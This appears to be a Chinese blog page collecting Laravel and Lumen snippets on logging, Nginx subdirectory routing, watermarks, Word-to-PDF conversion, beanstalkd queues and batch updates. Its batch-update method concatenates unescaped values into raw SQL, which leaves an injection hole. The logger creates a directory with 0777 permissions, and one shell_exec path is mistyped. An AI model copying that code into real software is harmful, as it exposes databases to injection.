<h3 id="设置错误等级"><a href="#设置错误等级" class="headerlink" title="设置错误等级"></a>设置错误等级</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> /vendor/laravel/framework/src/Illuminate/Foundation/Bootstrap/HandleExceptions.php:<span class="number">12</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params">Application $app</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;app = $app;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($app-&gt;environment(<span class="string">'production'</span>)) &#123;</span><br><span class="line">            error_reporting(E_ERROR);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_reporting(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		set_error_handler([$<span class="keyword">this</span>, <span class="string">'handleError'</span>]);</span><br><span class="line"></span><br><span class="line">		set_exception_handler([$<span class="keyword">this</span>, <span class="string">'handleException'</span>]);</span><br><span class="line"></span><br><span class="line">		register_shutdown_function([$<span class="keyword">this</span>, <span class="string">'handleShutdown'</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( $app-&gt;environment(<span class="string">'production'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			ini_set(<span class="string">'display_errors'</span>, <span class="string">'Off'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="图片添加水印"><a href="#图片添加水印" class="headerlink" title="图片添加水印"></a>图片添加水印</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image</span><br><span class="line">在我的测试图片文件夹 images 里有一张主图 main.png 和一张水印图 watermark.png。</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">addWatermark</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   $img = Image::make(public_path(<span class="string">'images/main.png'</span>));    </span><br><span class="line">   $img-&gt;insert(public_path(<span class="string">'watermark.png'</span>),<span class="string">'bottom-right'</span>,<span class="number">10</span>, <span class="number">10</span>); </span><br><span class="line">   $img-&gt;save();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/32414</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-配置二级目录访问"><a href="#Laravel-配置二级目录访问" class="headerlink" title="Laravel 配置二级目录访问"></a>Laravel 配置二级目录访问</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">域名 http:<span class="comment">//test.local 正常访问，对应项目地址 E:/Project/Test</span></span><br><span class="line">域名 http:<span class="comment">//test.local/module2 正常访问，对应项目地址 E:/Project/Module2</span></span><br><span class="line">废话不说上配置https:<span class="comment">//learnku.com/articles/32499</span></span><br><span class="line"></span><br><span class="line">Nginx 配置文件 test_local.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  test.local;</span><br><span class="line"></span><br><span class="line">    root E:<span class="regexp">/Project/</span>Test;</span><br><span class="line">    index  index.php index.html;</span><br><span class="line"></span><br><span class="line">    # 转发到端口</span><br><span class="line">    location /module2/ &#123;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Host $proxy_host;</span><br><span class="line">        proxy_set_header X-Forwarded-Port $proxy_port;</span><br><span class="line">        proxy_pass http:<span class="comment">//127.0.0.1:8081/;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    location ~ \.php$ &#123;</span></span><br><span class="line"><span class="regexp">        fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="regexp">        fastcgi_index  index.php;</span></span><br><span class="line"><span class="regexp">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="regexp">        include        fastcgi_params;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">server &#123;</span></span><br><span class="line"><span class="regexp">    listen       8081;</span></span><br><span class="line"><span class="regexp">    server_name 127.0.0.1;</span></span><br><span class="line"><span class="regexp">    root E:/</span>Project/Module2;</span><br><span class="line">    index  index.php index.html;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    location ~ \.php$ &#123;</span></span><br><span class="line"><span class="regexp">        fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="regexp">        fastcgi_index  index.php;</span></span><br><span class="line"><span class="regexp">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="regexp">        include        fastcgi_params;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">module2 的 Laravel 配置 Url</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">.env</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">APP_URL=http:/</span><span class="regexp">/test.local/m</span>odule2</span><br><span class="line">app/Providers/AppServiceProvider</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 用于修正URL生成的链接</span></span><br><span class="line">        app(<span class="string">'url'</span>)-&gt;forceRootUrl(config(<span class="string">'app.url'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 用于修正分页的链接</span></span><br><span class="line">        \Illuminate\Pagination\Paginator::currentPathResolver(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;app[<span class="string">'url'</span>]-&gt;current();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Lumen-日志自定义"><a href="#Lumen-日志自定义" class="headerlink" title="Lumen 日志自定义"></a>Lumen 日志自定义</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、在 Providers 目录建立 LogServiceProvider.php 文件 代码如下</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Providers;</span><br><span class="line"></span><br><span class="line">use Carbon\Laravel\ServiceProvider;</span><br><span class="line">use Monolog\Formatter\LineFormatter;</span><br><span class="line">use Monolog\Handler\RotatingFileHandler;</span><br><span class="line">use Monolog\Processor\IntrospectionProcessor;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $handlers[] = (<span class="keyword">new</span> RotatingFileHandler(storage_path(<span class="string">'logs/lumen.log'</span>), <span class="number">0</span>))</span><br><span class="line">            -&gt;pushProcessor(<span class="keyword">new</span> IntrospectionProcessor())</span><br><span class="line">            -&gt;setFormatter(<span class="keyword">new</span> LineFormatter(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;app[<span class="string">'log'</span>]-&gt;setHandlers($handlers);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">2</span>、在 bootstrap/app.php 注册该服服</span><br><span class="line"></span><br><span class="line">    $app-&gt;register(App\Providers\LogServiceProvider::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="number">3</span>、使用测试</span><br><span class="line"></span><br><span class="line">    app(<span class="string">'log'</span>)-&gt;info(<span class="string">'我是测试日志'</span>);</span><br><span class="line"><span class="number">4</span>、生成的日志信息</span><br><span class="line"></span><br><span class="line">[<span class="number">2018</span><span class="number">-04</span><span class="number">-11</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">29.313456</span>] local.INFO: 我是来测试日志的 &#123;<span class="string">"content"</span>:<span class="number">1111</span>&#125; </span><br><span class="line">https:<span class="comment">//learnku.com/articles/32543</span></span><br></pre></td></tr></table></figure>
<h3 id="Lumen-实时记录-SQL"><a href="#Lumen-实时记录-SQL" class="headerlink" title="Lumen 实时记录 SQL"></a>Lumen 实时记录 SQL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、在 Listeners 目录新建 QueryListener.php 文件 代码如下：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Listeners;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Events\QueryExecuted;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueryListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">QueryExecuted $event</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (env(<span class="string">'APP_ENV'</span>, <span class="string">'production'</span>) == <span class="string">'local'</span>) &#123;</span><br><span class="line">            $sql = str_replace(<span class="string">'?'</span>, <span class="string">"'%s'"</span>, $event-&gt;sql);</span><br><span class="line">            $log = vsprintf($sql, $event-&gt;bindings);</span><br><span class="line">            $<span class="keyword">this</span>-&gt;put_log(<span class="string">'sql'</span>, $log);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">put_log</span>(<span class="params">$file = <span class="string">'app'</span>, $content = <span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $data = date(<span class="string">'Y-m-d'</span>);</span><br><span class="line">        $cut_line = str_repeat(<span class="string">"-"</span>, <span class="number">100</span>);</span><br><span class="line">        is_dir(storage_path(<span class="string">'logs/sql'</span>)) or mkdir (storage_path(<span class="string">'logs/sql'</span>), <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">// 文件夹不存在则创建</span></span><br><span class="line">        $content = <span class="string">'['</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">"]"</span> . $content;</span><br><span class="line">        @file_put_contents(storage_path(<span class="string">'logs/sql/'</span> . $file . <span class="string">'-'</span> . $data . <span class="string">'.log'</span>), $content . <span class="string">"\n"</span> . $cut_line . <span class="string">"\n\n"</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">2</span>、在 Providers/EventServiceProvider.php 添加如下代码</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Providers;</span><br><span class="line"></span><br><span class="line">use Laravel\Lumen\Providers\EventServiceProvider <span class="keyword">as</span> ServiceProvider;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The event listener mappings for the application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $listen = [</span><br><span class="line"></span><br><span class="line">        <span class="string">'Illuminate\Database\Events\QueryExecuted'</span> =&gt; [</span><br><span class="line">            <span class="string">'App\Listeners\QueryListener'</span></span><br><span class="line">        ],</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3</span>、在 bootstrap/app.php 文件中开启 EventServiceProvider 注册即可</span><br><span class="line"></span><br><span class="line"> $app-&gt;register(App\Providers\EventServiceProvider::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="number">4</span>、接下来写一个 sql 语句就能在 storage/logs/sql 看到生成的 sql 日志了</span><br><span class="line"></span><br><span class="line">    app(<span class="string">'db'</span>)-&gt;where(<span class="string">'id'</span>, <span class="string">'&gt;'</span>, <span class="string">'5'</span>)-&gt;get();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32540</span></span><br></pre></td></tr></table></figure>
<h3 id="替换-Word-里面变量并导出-PDF"><a href="#替换-Word-里面变量并导出-PDF" class="headerlink" title="替换 Word 里面变量并导出 PDF"></a>替换 Word 里面变量并导出 PDF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    composer <span class="built_in">require</span> phpoffice/phpword</span><br><span class="line">use PhpOffice\PhpWord\TemplateProcessor;</span><br><span class="line"> $path = storage_path(<span class="string">'aa.docx'</span>);</span><br><span class="line">        <span class="comment">// 生成world 存放目录</span></span><br><span class="line">        $filePath = storage_path(<span class="string">'contract.docx'</span>);</span><br><span class="line">        <span class="comment">// 声明模板象并读取模板内容</span></span><br><span class="line">        $templateProcessor = <span class="keyword">new</span> TemplateProcessor($path);</span><br><span class="line">        <span class="comment">// 替换模板内容</span></span><br><span class="line">        $templateProcessor-&gt;setValue(<span class="string">'contract'</span>, <span class="string">'北京乙方'</span>);  <span class="comment">// 乙方</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成新的 world</span></span><br><span class="line">        $templateProcessor-&gt;saveAs($filePath);</span><br><span class="line">      apt-get install unoconv</span><br><span class="line">      #如果报错请求服务器语言设置为 LANG=”en_US.UTF-8″</span><br><span class="line">      </span><br><span class="line">      #使用命令把 word 转为 pdf</span><br><span class="line">      unoconv -f pdf aa.docx</span><br><span class="line">      #这个时候在当前目录下就会有一个 aa.pdf 的文件出来</span><br><span class="line">      #但是会发现如果是中文的情况下转出来的 pdf 是乱码该如何解决  </span><br><span class="line">            # 把电脑本机的宋体上传到服务器字体目录下 /usr/share/fonts 新建一个目录 win 或者其它，把中文字体上传到该目录下</span><br><span class="line">            apt-get install mkfontscale  #安装这个工具</span><br><span class="line">            # 进入到/usr/share/fonts/win/ 执行命令</span><br><span class="line">            mkfontscale &amp;&amp; sudo mkfontdir &amp;&amp; sudo fc-cache -fv</span><br><span class="line">            # 然后重启服务器让字体生效</span><br><span class="line">            reboot</span><br><span class="line">            # 最后在执行</span><br><span class="line">            unoconv -f pdf aa.docx</span><br><span class="line">            # 看是不是中文乱码的问题解决了</span><br><span class="line">      使用 php 的执行 shell 的函数来调用该函数自动生成即可</span><br><span class="line">      </span><br><span class="line">      shell_exec(<span class="string">'/usr/binunoconv -f pdf aa.docx'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="主键进行批量更新"><a href="#主键进行批量更新" class="headerlink" title="主键进行批量更新"></a>主键进行批量更新</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 根据Id批量更新数据，可以放在model里面，使得每个model都是调用这个方法</span></span><br><span class="line"><span class="comment">   * @author yezi</span></span><br><span class="line"><span class="comment">   * @param array $multipleData</span></span><br><span class="line"><span class="comment">   * @return bool</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">updateBatch</span>(<span class="params">$multipleData = array(</span>))</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $tableName = \DB::getTablePrefix() . app(Contract::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">getTable</span>()</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_array($multipleData))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> CustomValidationException(<span class="string">'must be an array'</span>,<span class="literal">null</span>,<span class="string">'6001'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($multipleData <span class="keyword">as</span> &amp;$row)&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!array_key_exists(<span class="string">'id'</span>,$row))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> CustomValidationException(<span class="string">'参数错误,缺少主键'</span>,<span class="literal">null</span>,<span class="string">'6001'</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $row[Model::FIELD_UPDATED_AT] = Carbon::now();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($tableName &amp;&amp; !empty($multipleData)) &#123;</span><br><span class="line"></span><br><span class="line">      $updateColumn  = array_keys($multipleData[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      $referenceColumn = $updateColumn[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">      unset($updateColumn[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      $whereIn = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">      $q = <span class="string">"UPDATE "</span> . $tableName . <span class="string">" SET "</span>;</span><br><span class="line"></span><br><span class="line">      foreach ($updateColumn <span class="keyword">as</span> $uColumn) &#123;</span><br><span class="line"></span><br><span class="line">        $q .= $uColumn . <span class="string">" = CASE "</span>;</span><br><span class="line"></span><br><span class="line">        foreach ($multipleData <span class="keyword">as</span> $data) &#123;</span><br><span class="line"></span><br><span class="line">          $q .= <span class="string">"WHEN "</span> . $referenceColumn . <span class="string">" = "</span> . $data[$referenceColumn] . <span class="string">" THEN '"</span> . $data[$uColumn] . <span class="string">"' "</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $q .= <span class="string">"ELSE "</span> . $uColumn . <span class="string">" END, "</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      foreach ($multipleData <span class="keyword">as</span> $data) &#123;</span><br><span class="line"></span><br><span class="line">        $whereIn .= <span class="string">"'"</span> . $data[$referenceColumn] . <span class="string">"', "</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $q = rtrim($q, <span class="string">", "</span>) . <span class="string">" WHERE "</span> . $referenceColumn . <span class="string">" IN ("</span> . rtrim($whereIn, <span class="string">', '</span>) . <span class="string">")"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> \DB::update(\DB::raw($q));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;https:<span class="comment">//geixue.com/blogs/channels/laravel/laravel-shares-a-way-to-do-bulk-updates-based-on-the-primary-key-qjhqc5</span></span><br></pre></td></tr></table></figure>
<h3 id="Laradock-中使用-beanstalkd"><a href="#Laradock-中使用-beanstalkd" class="headerlink" title="Laradock 中使用 beanstalkd"></a>Laradock 中使用 beanstalkd</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker-compose up -d beanstalkd</span><br><span class="line">composer <span class="built_in">require</span> pda/pheanstalk</span><br><span class="line">更改 .env 文件</span><br><span class="line"></span><br><span class="line">设置 QUEUE_CONNECTION 为 beanstalkd, 设置 beanstalkd 为默认队列驱动。</span><br><span class="line">新增配置项 QUEUE_HOST=beanstalkd，代表使用 laradock 中 beanstalkd 的 host 以及端口，端口默认值为 <span class="number">11300</span>。</span><br><span class="line">QUEUE_HOST=beanstalkd </span><br><span class="line">QUEUE_CONNECTION=beanstalkd</span><br><span class="line">更改 config/queue.php 文件</span><br><span class="line"></span><br><span class="line">修改 connections 下面的 beanstalkd 数组中 host 的值为 env(<span class="string">'QUEUE_HOST'</span>, <span class="string">'localhost'</span>)，意思就是默认使用 .env 文件中定义的 QUEUE_HOST 值</span><br><span class="line"></span><br><span class="line"><span class="string">'connections'</span> =&gt; [</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line"></span><br><span class="line">    <span class="string">'beanstalkd'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'beanstalkd'</span>,</span><br><span class="line">        <span class="string">'host'</span> =&gt; env(<span class="string">'QUEUE_HOST'</span>, <span class="string">'localhost'</span>),</span><br><span class="line">        <span class="string">'queue'</span> =&gt; <span class="string">'default'</span>,</span><br><span class="line">        <span class="string">'retry_after'</span> =&gt; <span class="number">90</span>,</span><br><span class="line">        <span class="string">'block_for'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    ],</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">],</span><br><span class="line">使用 beanstalkd_console 从 Web 界面管理您的队列</span><br><span class="line"></span><br><span class="line">运行 Beanstalkd 控制台容器</span><br><span class="line">docker-compose up -d beanstalkd-<span class="built_in">console</span></span><br><span class="line">访问 http:<span class="comment">//localhost:2080/  https://learnku.com/articles/32366</span></span><br></pre></td></tr></table></figure>
<h3 id="注册了多少条路由"><a href="#注册了多少条路由" class="headerlink" title="注册了多少条路由"></a>注册了多少条路由</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan route:list | wc -l | awk <span class="string">'&#123;print $1 - 4&#125;'</span></span><br><span class="line">获取到上面的统计到的行数再减去 <span class="number">4</span>（因为 list 中包含了 <span class="number">3</span> 行制表符 和 <span class="number">1</span> 行表头），最终得到了你的路由数量</span><br></pre></td></tr></table></figure>
